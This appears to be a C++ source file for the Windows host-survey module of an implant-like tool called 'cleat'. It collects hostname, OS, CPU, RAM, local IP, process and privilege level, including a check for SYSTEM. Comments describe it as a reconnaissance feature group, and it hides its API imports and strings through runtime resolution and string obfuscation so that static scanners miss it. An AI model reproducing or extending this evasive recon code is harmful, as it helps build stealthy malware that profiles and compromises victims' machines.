#define WIN32_LEAN_AND_MEAN
#include "PlatformWin_SystemInfo.hpp"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winreg.h>
#include <iphlpapi.h>
#include <sysinfoapi.h>
#include <versionhelpers.h>

#include <string>
#include <sstream>
#include <vector>
#include <memory>
#include <cstring>

// 注: ApiResolver(内含 windows.h)必须位于所有系统头之后 ——
// 先于 winsock2/ws2tcpip 展开会让 windows.h 拉入旧 winsock.h 导致
// fd_set/sockaddr 等重定义(C2011)。
#include "Common/Obfuscation/StringObf.hpp"
#include "Core/Native/Win/ApiResolver.hpp"

#pragma comment(lib, "iphlpapi.lib")

namespace cleat {
	namespace {

		// 导入表脱敏: 系统侦察特征组(主机名/注册表读/令牌查询/SID 比较)经
		// ApiResolver 运行时解析。
		const auto pGetComputerNameW =
			cleat::ApiResolver::Proc<BOOL(WINAPI*)(LPWSTR, LPDWORD)>(
				OBF_STR("kernel32.dll"), OBF_STR("GetComputerNameW"));
		const auto pGetComputerNameA =
			cleat::ApiResolver::Proc<BOOL(WINAPI*)(LPSTR, LPDWORD)>(
				OBF_STR("kernel32.dll"), OBF_STR("GetComputerNameA"));
		const auto pRegOpenKeyExA =
			cleat::ApiResolver::Proc<LSTATUS(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY)>(
				OBF_STR("advapi32.dll"), OBF_STR("RegOpenKeyExA"));
		const auto pRegQueryValueExA =
			cleat::ApiResolver::Proc<LSTATUS(WINAPI*)(HKEY, LPCSTR, LPDWORD, LPDWORD,
				LPBYTE, LPDWORD)>(
				OBF_STR("advapi32.dll"), OBF_STR("RegQueryValueExA"));
		const auto pOpenProcessToken =
			cleat::ApiResolver::Proc<BOOL(WINAPI*)(HANDLE, DWORD, PHANDLE)>(
				OBF_STR("advapi32.dll"), OBF_STR("OpenProcessToken"));
		const auto pGetTokenInformation =
			cleat::ApiResolver::Proc<BOOL(WINAPI*)(HANDLE, TOKEN_INFORMATION_CLASS,
				LPVOID, DWORD, PDWORD)>(
				OBF_STR("advapi32.dll"), OBF_STR("GetTokenInformation"));
		const auto pAllocateAndInitializeSid =
			cleat::ApiResolver::Proc<BOOL(WINAPI*)(PSID_IDENTIFIER_AUTHORITY, BYTE,
				DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID*)>(
				OBF_STR("advapi32.dll"), OBF_STR("AllocateAndInitializeSid"));
		const auto pEqualSid =
			cleat::ApiResolver::Proc<BOOL(WINAPI*)(PSID, PSID)>(
				OBF_STR("advapi32.dll"), OBF_STR("EqualSid"));
		const auto pFreeSid =
			cleat::ApiResolver::Proc<PVOID(WINAPI*)(PSID)>(
				OBF_STR("advapi32.dll"), OBF_STR("FreeSid"));

		// ---------- 辅助工具函数 ----------
		std::string WStringToString(const std::wstring& wstr) {
			if (wstr.empty()) return {};
			int len = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
			if (len <= 0) return {};
			std::string str(len - 1, '\0');
			WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, &str[0], len, nullptr, nullptr);
			return str;
		}

		std::string GetHostName() {
			wchar_t buf[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
			DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
			if (pGetComputerNameW && pGetComputerNameW(buf, &size)) {
				return WStringToString(buf);
			}
			return "Unknown";
		}

		std::string GetOSVersionString() {
			HMODULE hNtdll = GetModuleHandleW(OBF_WSTR(L"ntdll.dll").c_str());
			if (!hNtdll) return "Unknown";

			using RtlGetVersionFn = LONG(WINAPI*)(PRTL_OSVERSIONINFOW);
			auto RtlGetVersion = reinterpret_cast<RtlGetVersionFn>(GetProcAddress(hNtdll, OBF_STR("RtlGetVersion").c_str()));
			if (!RtlGetVersion) return "Unknown";

			RTL_OSVERSIONINFOW ver = { sizeof(RTL_OSVERSIONINFOW) };
			if (RtlGetVersion(&ver) != 0) return "Unknown";

			const char* friendly = "Unknown Windows";
			if (ver.dwMajorVersion == 10 && ver.dwBuildNumber >= 22000)
				friendly = "Windows 11";
			else if (ver.dwMajorVersion == 10)
				friendly = "Windows 10";
			else if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 3)
				friendly = "Windows 8.1";
			else if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 2)
				friendly = "Windows 8";
			else if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 1)
				friendly = "Windows 7";
			else if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 0)
				friendly = "Windows Vista";
			else if (ver.dwMajorVersion == 5 && ver.dwMinorVersion == 2)
				friendly = "Windows Server 2003/XP x64";
			else if (ver.dwMajorVersion == 5 && ver.dwMinorVersion == 1)
				friendly = "Windows XP";

			std::ostringstream oss;
			oss << friendly << " " << ver.dwMajorVersion << "." << ver.dwMinorVersion
				<< " (Build " << ver.dwBuildNumber << ")";
			return oss.str();
		}

		std::string GetArchitecture() {
			SYSTEM_INFO si;
			GetNativeSystemInfo(&si);
			switch (si.wProcessorArchitecture) {
			case PROCESSOR_ARCHITECTURE_AMD64: return "x86_64";
			case PROCESSOR_ARCHITECTURE_ARM64: return "ARM64";
			case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
			default: return "Unknown";
			}
		}

		std::string GetCPUInfo(uint32_t& out_cores) {
			SYSTEM_INFO si;
			GetSystemInfo(&si);
			out_cores = si.dwNumberOfProcessors;

			HKEY hKey = nullptr;
			std::string cpuName = "Unknown CPU";
			if (pRegOpenKeyExA && pRegOpenKeyExA(HKEY_LOCAL_MACHINE,
				OBF_STR("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0").c_str(),
				0, KEY_READ, &hKey) == ERROR_SUCCESS) {
				char buf[256] = { 0 };
				DWORD size = sizeof(buf);
				if (pRegQueryValueExA && pRegQueryValueExA(hKey, OBF_STR("ProcessorNameString").c_str(), nullptr, nullptr,
					reinterpret_cast<LPBYTE>(buf), &size) == ERROR_SUCCESS) {
					cpuName = buf;
				}
				RegCloseKey(hKey);
			}
			return cpuName;
		}

		uint64_t GetTotalRamBytes() {
			MEMORYSTATUSEX mem = { sizeof(MEMORYSTATUSEX) };
			if (GlobalMemoryStatusEx(&mem)) {
				return mem.ullTotalPhys;
			}
			return 0;
		}

		uint32_t GetCurrentPID() {
			return static_cast<uint32_t>(::GetCurrentProcessId());
		}

		std::string GetProcessName() {
			char buf[MAX_PATH] = { 0 };
			if (GetModuleFileNameA(nullptr, buf, MAX_PATH) > 0) {
				std::string path(buf);
				auto pos = path.find_last_of("\\/");
				return (pos != std::string::npos) ? path.substr(pos + 1) : path;
			}
			return "unknown";
		}

		std::string GetPrivilegeLevel() {
			// 检测当前进程权限级别: SYSTEM > High(管理员) > Medium(标准) > Low
			HANDLE hToken = nullptr;
			if (!pOpenProcessToken || !pGetTokenInformation) {
				return "Unknown";
			}
			if (!pOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
				return "Unknown";
			}

			DWORD infoLen = 0;
			pGetTokenInformation(hToken, TokenElevation, nullptr, 0, &infoLen);
			if (infoLen == 0) { CloseHandle(hToken); return "Unknown"; }

			std::vector<BYTE> buf(infoLen);
			TOKEN_ELEVATION elevation{};
			if (!pGetTokenInformation(hToken, TokenElevation, buf.data(), infoLen, &infoLen)) {
				CloseHandle(hToken);
				return "Unknown";
			}
			elevation = *reinterpret_cast<TOKEN_ELEVATION*>(buf.data());
			bool isElevated = elevation.TokenIsElevated != 0;

			// 检查是否 SYSTEM: 读 SID
			DWORD userLen = 0;
			pGetTokenInformation(hToken, TokenUser, nullptr, 0, &userLen);
			if (userLen > 0) {
				std::vector<BYTE> userBuf(userLen);
				if (pGetTokenInformation(hToken, TokenUser, userBuf.data(), userLen, &userLen)) {
					auto* tokenUser = reinterpret_cast<TOKEN_USER*>(userBuf.data());
					// SYSTEM SID: S-1-5-18
					SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
					PSID systemSid = nullptr;
					if (pAllocateAndInitializeSid && pEqualSid && pFreeSid &&
						pAllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
							0, 0, 0, 0, 0, 0, 0, &systemSid)) {
						if (pEqualSid(tokenUser->User.Sid, systemSid)) {
							pFreeSid(systemSid);
							CloseHandle(hToken);
							return "SYSTEM";
						}
						pFreeSid(systemSid);
					}
				}
			}
			CloseHandle(hToken);

			return isElevated ? "High" : "Medium";
		}

		std::string GetLocalIP() {
			SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
			if (sock == INVALID_SOCKET) {
				return "";
			}

			sockaddr_in destAddr{};
			destAddr.sin_family = AF_INET;
			destAddr.sin_port = htons(53);
			if (inet_pton(AF_INET, "8.8.8.8", &destAddr.sin_addr) != 1) {
				closesocket(sock);
				return "";
			}

			if (connect(sock, reinterpret_cast<sockaddr*>(&destAddr), sizeof(destAddr)) == SOCKET_ERROR) {
				closesocket(sock);
				return "";
			}

			sockaddr_in localAddr{};
			int addrLen = sizeof(localAddr);
			if (getsockname(sock, reinterpret_cast<sockaddr*>(&localAddr), &addrLen) == SOCKET_ERROR) {
				closesocket(sock);
				return "";
			}

			char ipStr[INET_ADDRSTRLEN] = { 0 };
			if (inet_ntop(AF_INET, &localAddr.sin_addr, ipStr, sizeof(ipStr)) == nullptr) {
				closesocket(sock);
				return "";
			}

			closesocket(sock);
			return std::string(ipStr);
		}
	} // anonymous namespace

	// ---------- 实现类 ----------
	SystemInfo SystemInfoWin::GetSystemInfo() {
		SystemInfo info;
		info.hostname = GetHostName();
		info.os_name = "Windows";
		info.os_version = GetOSVersionString();
		info.architecture = GetArchitecture();
		info.total_ram_bytes = GetTotalRamBytes();
		uint32_t cores = 0;
		info.cpu_brand = GetCPUInfo(cores);
		info.cpu_cores = cores;
		info.local_ip = GetLocalIP();
		info.pid = GetCurrentPID();
		info.process_name = GetProcessName();
		info.privilege = GetPrivilegeLevel();

		return info;
	}

	

} // namespace cleat